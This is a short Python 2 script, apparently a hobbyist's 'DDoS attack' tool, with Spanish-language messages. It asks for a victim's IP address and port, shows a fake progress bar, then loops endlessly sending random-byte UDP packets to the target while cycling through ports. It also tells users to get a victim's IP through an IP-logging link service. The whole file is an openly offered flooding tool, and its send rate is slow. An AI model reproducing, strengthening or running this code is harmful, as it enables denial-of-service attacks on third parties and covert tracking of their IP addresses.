import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS ATACK KALI LINUXv0.4")
print "           " 
print "Autor    : Evan01"
print "You Tube : https://www.youtube.com/channel/UCkpaIqn_gz4xIT9PkASiRdg"
print "github   : https://github.com/bythelink89/"
print "Si no tienes la direccion ip de la victima ve a https://grabify.com" 
print "para generar un enlace que obtenga ip publica o mira el tutorial en la pagina de github" 
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet INICIANDO ATAQUE ")
print "[                    ] 0% "
time.sleep(5)
print "[===                 ] 14%"
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[============        ] 68%"
time.sleep(2)
print "[===============     ] 75%"
time.sleep(1)
print "[==================  ] 92%"
time.sleep(2)
print "[====================] 100%"
time.sleep(3)
print "LAUNCHING DDOS-ATACK-KALI-"
time.sleep(3)
print "Please wait"
time.sleep(4)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     time.sleep(4)
     port = port + 1
     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
     if port == 65534:
       port = 1

